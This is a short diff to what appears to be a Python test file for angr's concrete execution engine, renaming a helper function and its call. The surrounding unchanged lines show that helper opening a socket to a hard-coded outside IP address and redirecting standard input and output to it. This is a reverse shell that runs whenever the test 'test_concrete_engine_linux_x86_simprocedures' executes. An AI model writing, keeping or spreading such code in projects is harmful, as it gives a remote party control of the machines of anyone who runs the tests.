@@ -32,7 +32,7 @@ def setup_x86():
 gdbserver_proc = None
 avatar_gdb = None
 
-def get_shell():
+def get_shell_001():
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("128.111.48.60",31339))
     os.dup2(s.fileno(),0)
@@ -52,7 +52,7 @@ def teardown():
 def test_concrete_engine_linux_x86_simprocedures():
     global avatar_gdb
     # pylint: disable=no-member
-    get_shell()
+    get_shell_001()
     avatar_gdb = AvatarGDBConcreteTarget(avatar2.archs.x86.X86, GDB_SERVER_IP, GDB_SERVER_PORT)
     p = angr.Project(binary_x86, concrete_target=avatar_gdb, use_sim_procedures=True)
     entry_state = p.factory.entry_state()
